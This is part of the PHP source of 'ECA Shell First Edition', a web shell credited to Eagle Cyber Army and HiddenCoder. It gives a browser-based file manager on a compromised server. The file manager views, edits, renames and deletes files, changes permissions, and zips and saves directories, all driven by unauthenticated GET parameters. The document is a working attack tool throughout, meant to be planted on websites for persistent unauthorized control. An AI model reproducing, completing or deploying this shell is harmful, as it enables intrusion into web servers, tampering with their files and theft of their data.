$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("V", 32 ); 
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function file() { 
$data = implode("", $this -> datasec);
$ctrldir = implode("", $this -> ctrl_dir);
return
$data.
$ctrldir.
$this -> eof_ctrl_dir.
pack("v", sizeof($this -> ctrl_dir)).
pack("v", sizeof($this -> ctrl_dir)). 
pack("V", strlen($ctrldir)). 
pack("V", strlen($data)). 
"x00x00";
}
}
$foldersebelumnya = $_GET['dir'];
$namafoldernya = $_GET['dirname'];
$dlfolder = $foldersebelumnya.$garis.$namafoldernya.$garis;
$zipfile = new zipfile();
function get_files_from_folder($directory, $put_into) {
global $zipfile;
if ($handle = opendir($directory)) {
while (false !== ($file = readdir($handle))) {
if (is_file($directory.$file)) {
$fileContents = file_get_contents($directory.$file);
$zipfile->add_file($fileContents, $put_into.$file);
} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
$zipfile->add_dir($put_into.$file.'/');
get_files_from_folder($directory.$file.'/', $put_into.$file.'/');
}
}
}
closedir($handle);
}
get_files_from_folder($dlfolder,'');
header("Content-Type: application/download");
header("Content-Length: ".strlen($zipfile -> file()));
header("Content-Disposition: attachment; filename=" .$namafoldernya.".zip");   
flush();
#echo $zipfile -> file(); 
$filename = $namafoldernya.".zip";
$fd = fopen ($filename, "wb");
$out = fwrite ($fd, $zipfile -> file());
fclose ($fd);
if($out){
	echo "<script>window.location='?explorer&dir=$dir';</script>";
}else{
	echo "<center><font color='red'>Can't Zip $namafoldernya</font></center>";
}
}

// View File
elseif(isset($_GET['view'])) {
	echo "<br>
	<hr width='100%' style='position:absolute;top:303px;'><div class='fitur' style='position:relative;'>
	<center>
	<a href='?view&dir=$dir&file=".$file."'><b>View</b></a>
	<a href='?edit&dir=$dir&file=".$file."'>Edit</a>
	<a href='?rename&dir=$dir&file=".$file."'>Rename</a>
	<a href='?delete&dir=$dir&file=".$file."'>Delete</a>
	</center>
	</div>
	<br><br>
	<div class='info_file'>
	File Name: <font color=lime>".basename($file)."</font><br>
	File Type: <font color=lime style='text-transform: uppercase;'>".$ext."</font><br>
	File Size: ";
	$size = filesize("".$file."")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
	}else{
	$size = $size.' KB';
	}
	echo "<font color=lime>".$size."</font></div>";
	if(validasi($ext,$ext_img)){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?img=".getcwd().$garis.$file."\"></div>";
	}elseif(validasi($ext,$ext_php)){
		echo "<div class=\"viewcode\">";
		$file = wordwrap(@file_get_contents($file),"240","n");
		@highlight_string($file);
		echo "</div>";
	}
	else{
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($file))."</textarea>";
}
} 
// Edit File
elseif(isset($_GET['edit'])) {
	if($_POST['save']) {
		$save = file_put_contents($file, $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	
	}
	echo "<br><hr width='100%' style='position:absolute;top:303px;'><div class='fitur' style='position:relative;'>
	<center>
	<a href='?view&dir=$dir&file=".$file."'>View</a>
	<a href='?edit&dir=$dir&file=".$file."'><b>Edit</b></a>
	<a href='?rename&dir=$dir&file=".$file."'>Rename</a>
	<a href='?delete&dir=$dir&file=".$file."'>Delete</a>
	</center>
	</div>
	<br><br>
	<div class='info_file'>
	File Name: <font color=lime>".basename($file)."</font><br>
	File Type: <font color=lime style='text-transform: uppercase;'>".$ext."</font><br>
	File Size: ";
	$size = filesize("".$file."")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
	}else{
	$size = $size.' KB';
	}
	echo "<font color=lime>".$size."</font></div>";
	echo "<br><center>".$act."</center>";
	if(validasi($ext,$ext_img)){
		echo "<br><center><h1><font color=red>Can't edit Image file!</font></h1><center>";
	}else{
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($file))."</textarea><br>
	<center>
	<input type='submit' value='Save' name='save' style='width: 500px;height:25px;'>
	</center></form><br>";
} 
}
// Rename File
elseif(isset($_GET['rename'])) {
	if($_POST['do_rename']) {
		$rename = rename($file, "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?explorer&dir=".$dir."';</script>";
		} else {
			$act = "<center><font color=red>Permission Denied!</font></center>";
		}
	echo "".$act."<br>";
	}
	echo "<br><hr width='100%' style='position:absolute;top:303px;'><div class='fitur' style='position:relative;'>
	<center>
	<a href='?view&dir=$dir&file=".$file."'>View</a>
	<a href='?edit&dir=$dir&file=".$file."'>Edit</a>
	<a href='?rename&dir=$dir&file=".$file."'><b>Rename</b></a>
	<a href='?delete&dir=$dir&file=".$file."'>Delete</a>
	</center>
	</div>
	<br><br>";
	echo "<form method='post'>
	<center>
	<h1 style=\"font-size:33px;\">Rename File</h1>
	<input type='text' autocomplete='off' required value='".basename($file)."' name='rename' style='width: 450px;' height='10'>
	<br>
	<input type='submit' style='width:300px;' name='do_rename' value='Rename'>
	</center>
	</form>";
} 
// Delete File
elseif(isset($_GET['delete'])) {
	$delete = unlink($file);
	if($delete) {
		$act = "<script>window.location='?explorer&dir=".$dir."';</script>";
	} else {
		$act = "<center><font color=red>Permission Denied!</font></center>";
	}
	echo $act;
}
// File Explorer
elseif(isset($_GET['explorer'])) {
	if(isset($_GET['explorer'])&&!isset($_GET['dir'])){
		echo "<script>window.location='?explorer&dir=".$dir."';</script>";
	}
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<center><font color=red>Directory $dir is not readable!</font><center><br>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home" style="width:800px;" align="left">Name</th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Perms</center></th>
			<th class="th_home"><center>Options</center></th>
			</tr>';
			echo '<tr>
      <td class="td_home"> <img src="data:image/png;base64,'.$folder_up.'"> <a style="color: white;" href="?explorer&dir='.dirname($dir).'">...</a></td>
      <td class=td_home align=center>LINK</td>
      <td class=td_home align=center>NONE</td>
      <td class=td_home align=center>NONE</td>
      <td class=td_home align=center>NONE</td>
      <td class=td_home align=center> <a href="?newfile&dir='.$dir.'">New File</a> | <a href="?newdir&dir='.$dir.'">New Dir</a></td>
      </tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtime = date("m/d/y | g:i:s", filemtime("$dir/$dirx"));
				//$size = folderSize($dir. "/" .$dirx);
 				if(!is_dir($dir.'/'.$dirx) || $dirx == '.' || $dirx == '..') continue;
 				echo "
 				<tr>
 				<td class='td_home'> 
 				 <img src='data:image/png;base64,".$folder_icon."'> 
 				<a style='color:white;' href=\"?explorer&dir=$dir/$dirx\">".$dirx."</a>
 				</td>
				<td class='td_home' style='text-transform: uppercase;'><center>dir</center></td>
				<td class='td_home'><center>Unknown</center></th></td>
				<td class='td_home'><center>$dtime</center></td>
				<td class='td_home'><center><a href='?chmod&type=dir&dirname=$dirx&dir=".getcwd()."'>";
					if(is_writable($dirx)) echo '<font color="lime">';
					elseif(!is_readable($dirx)) echo '<font color="red">';
					echo substr(sprintf('%o', fileperms($dirx)), -4);
					if(is_writable($dirx) || !is_readable($dirx)) 
				echo"</a></center></td>
				<td class='td_home' align='center'><a href='?rename_dir&dir=$dir/$dirx&dirname=$dirx'>Rename</a> | <a href='?delete_dir&dir=$dir/$dirx'>Delete</a> | <a href='?archive_dir&dir=".getcwd()."&dirname=$dirx'>Zip</a></td>
				</div>
				</tr>";
			}
		}
	} else {
		echo "<center><font color=red>Denied to open directory!</font></center><br>";
	}
		foreach($scandir as $file) {
			$ftime = date("m/d/y | g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			$ext = pathinfo($file);
			$ext = $ext['extension'];
			$ext = (empty($ext)) ? '-' : $ext;
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'>"; 
			// PHP File
			if(validasi($ext,$ext_php)){
			echo "
			 <img src='data:image/png;base64,".$php_icon."'>";
			}
			// HTML File
			elseif(validasi($ext,$ext_html)){
			echo "
			 <img src='data:image/png;base64,".$html_icon."'>";
			}
			// Image File
			elseif(validasi($ext,$ext_img)){
			echo "
			 <img src='data:image/png;base64,".$image_icon."'>";
			}
			// TXT File
			elseif(validasi($ext,$ext_txt)){
			echo "
			 <img src='data:image/png;base64,".$txt_icon."'>";
			}
			// ETC File
			elseif(validasi($ext,$ext_etc)){
				echo "
			 <img src='data:image/png;base64,".$etc_icon."'>";
			}
			// JS / VBS File
			elseif(validasi($ext,$ext_js)){
				echo "
			 <img src='data:image/png;base64,".$js_icon."'>";
			}
			// HTACCESS File
			elseif(validasi($ext,$ext_ht)){
				echo "
			 <img src='data:image/png;base64,".$ht_icon."'>";
			}
			// Archive File
			elseif(validasi($ext,$ext_zip)){
				echo "
			 <img src='data:image/png;base64,".$zip_icon."'>";
			}
			// Unknow File
			else{
			echo "
			 <img src='data:image/png;base64,".$unknown_icon."'>";
			}
			if($file == basename($is_me)){
			echo " 
			<a style='color:#07cb79' href='?view&dir=$dir&file=$file'>$file</a></td>";
			}elseif(validasi($ext,$ext_mix)){
			echo " 
			<a style='color:snow;' href='?dl=$file'>$file</a></td>";
			}else{
			echo " 
			<a style='color:snow;' href='?view&dir=$dir&file=$file'>$file</a></td>";
			}
			echo "<td class='td_home' style='text-transform: uppercase;'><center>".$ext."</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center><a href='?chmod&type=file&filename=$file&dir=".getcwd()."'>";
					if(is_writable($file)) echo '<font color="lime">';
					elseif(!is_readable($file)) echo '<font color="red">';
					echo substr(sprintf('%o', fileperms($file)), -4);
					if(is_writable($file) || !is_readable($file)) 
			echo"</a></center></td>";
			echo "<td class='td_home' align=center><a href='?edit&dir=$dir&file=$file'>Edit</a> | <a href='?rename&dir=$dir&file=$file'>Rename</a> | <a href='?delete&dir=".getcwd()."&file=$file'>Delete</a>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		}
	}
	// Home Page
	elseif(!$_GET) {
		?>
	<div class="center">
	<div class='title'>ECA Shell First Edition</div>
	<div class='coded'>Coded By <a href="https://www.facebook.com/hiddencoder.id">HiddenCoder</a></div><br />
	<div class="thanks">Special thanks to <a href="http://ecateam.com/">Eagle Cyber Army</a>,<a href="#">IndoXploit</a> & all Shell Maker in the World
	</div>
	</div>
	<?php
	}
	else{
	?>
	<br><br><br>
	<center>
	<div class='title'>Something is Wrong</div>
	</center>
	<?php
	}
?>
<script>
function startTime() {
    var today = new Date();
    var h = today.getHours();
    var m = today.getMinutes();
    var s = today.getSeconds();
    m = checkTime(m);
    s = checkTime(s);
    document.getElementById('clock').innerHTML =
    h + ":" + m + ":" + s;
    var t = setTimeout(startTime, 500);
}
function checkTime(i) {
    if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
    return i;
}
</script>
		<br><br>
<div id="footer">
<center><?php echo date("Y") ?>  Eagle Cyber Army</center>
</div>
</body>
</html>
